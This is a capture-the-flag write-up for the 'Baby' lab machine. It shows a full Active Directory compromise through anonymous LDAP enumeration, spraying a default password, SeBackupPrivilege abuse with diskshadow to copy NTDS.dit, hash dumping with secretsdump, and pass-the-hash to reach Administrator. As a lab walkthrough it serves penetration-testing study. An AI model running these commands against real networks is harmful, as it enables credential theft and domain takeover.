# HTB writeup Baby

## Enumeration

Start with a standard scan:

```bash
nmap -sC -sV baby.vl
```

Result:

```text
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http
636/tcp  open  ldapssl
3268/tcp open  ldap
3269/tcp open  ldapssl
3389/tcp open  ms-wbt-server
5985/tcp open  http
```

The target is clearly a Domain Controller. From the scan output:

* Domain: `baby.vl`
* Hostname: `BabyDC.baby.vl`

Add the entry locally:

```bash
echo "10.129.234.71 baby.vl BabyDC.baby.vl" | sudo tee -a /etc/hosts
```

---

## LDAP Enumeration

Since LDAP allows anonymous access, enumerate users:

```bash
ldapsearch -x -H ldap://baby.vl -b "dc=baby,dc=vl" "(objectClass=user)" sAMAccountName \
| grep sAMAccountName | awk '{print $2}' > users.txt
```

Next, dump full user objects:

```bash
ldapsearch -x -H ldap://baby.vl -b "dc=baby,dc=vl" "(objectClass=user)"
```

Within the output:

```text
description: Set initial password to BabyStart123!
```

This indicates a default password.

---

## Password Spray

Attempt the password against all users:

```bash
nxc ldap baby.vl -u users.txt -p 'BabyStart123!'
```

Result:

```text
baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

The credentials are valid, but the password must be changed.

---

## Password Reset

Reset the password via SMB:

```bash
smbpasswd -U caroline.robinson -r 10.129.234.71
```

* Old password: `BabyStart123!`
* New password: chosen value

---

## Foothold

Login via WinRM:

```bash
evil-winrm -i baby.vl -u caroline.robinson -p <NEW_PASSWORD>
```

---

## Privilege Escalation

### Enumeration

```powershell
whoami /priv
```

```text
SeBackupPrivilege             Enabled
SeRestorePrivilege            Enabled
```

```powershell
whoami /groups
```

```text
BUILTIN\Backup Operators
```

The user has backup privileges, allowing access to protected files.

---

## Dump Local Hashes

```powershell
reg save hklm\sam .\sam
reg save hklm\system .\system
```

Download:

```powershell
download sam
download system
```

Extract:

```bash
impacket-secretsdump -sam sam -system system LOCAL
```

This only yields local hashes and is not sufficient for domain compromise.

---

## Extract NTDS.dit

To access domain credentials, extract `NTDS.dit` using a shadow copy.

### Create DiskShadow Script

```powershell
Set-Content -Path backup.txt -Encoding ASCII -Value @'
set verbose on
set metadata C:\Windows\Temp\test.cab
set context persistent
add volume C: alias cdrive
create
expose %cdrive% E:
'@
```

When transferring or creating the file, ensure correct formatting:

```bash
unix2dos backup.txt
```

Without this, DiskShadow may fail to parse the script correctly.

---

### Execute DiskShadow

```powershell
diskshadow /s C:\Users\Caroline.Robinson\Documents\backup.txt
```

After successful execution, the shadow copy is exposed as:

```text
E:\
```

---

## Copy NTDS.dit

```powershell
robocopy /b E:\Windows\ntds . ntds.dit
```

Download:

```powershell
download ntds.dit
```

---

## Dump Domain Hashes

```bash
impacket-secretsdump -system system -ntds ntds.dit LOCAL
```

Relevant output:

```text
Administrator:500:...:ee4457ae59f1e3fbd764e33d9cef123d
```

---

## Pass-the-Hash

```bash
evil-winrm -i baby.vl -u administrator -H ee4457ae59f1e3fbd764e33d9cef123d
```

Verify:

```powershell
whoami
```

```text
baby\administrator
```

---

```powershell
cd C:\Users\Administrator\Desktop
type root.txt
```

---

## Summary

* Anonymous LDAP access allowed user enumeration
* Default password found in description field
* Password spray revealed valid account
* Password reset enabled initial access
* `SeBackupPrivilege` allowed reading protected files
* Shadow copy used to extract `NTDS.dit`
* Domain hashes dumped and reused via Pass-the-Hash
* Full Domain Administrator compromise achieved
